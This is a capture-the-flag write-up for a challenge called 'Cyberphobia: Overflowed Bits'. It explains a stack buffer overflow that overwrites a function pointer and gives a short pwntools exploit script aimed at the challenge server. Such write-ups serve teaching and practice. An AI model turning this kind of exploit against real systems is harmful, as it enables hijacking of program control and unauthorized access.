# [Cyberphobia: Overflowed Bits](https://spooky.ctfd.io/challenges#Cyberphobia:%20Overflowed%20Bits-19)

I can’t trust computers anymore. I trusted the input, it overflowed.

## Vulnerability

In `vuln()`, a struct holds `buf[64]` followed directly by a function pointer `direction`. The call `read(0, s.buf, 128)` accepts 128 bytes into a 64-byte buffer, so the extra bytes overwrite `direction`. The program then calls `s.direction()`, which jumps to whatever address we wrote.

## Exploitation

1. Run `checksec`. The binary has no PIE and no stack canary, so function addresses are fixed.
2. Get the target address with `nm main | grep corn_maze_exit`. It is `0x4011d6`.
3. Build the payload: 64 bytes of padding, then the address as 8 little-endian bytes. This overwrites `direction` with `corn_maze_exit`, which reads the secret file and prints it.
4. Send the payload when the program prompts `New sign direction: `.

```python
from pwn import *

elf = ELF('./main')
payload = b'A'*64 + p64(elf.sym['corn_maze_exit'])

p = remote('18.226.103.146', 1337)
p.sendafter(b'New sign direction: ', payload)
print(p.recvall(timeout=3).decode())
```

## Result

The server responds with:

[SCREEN01]
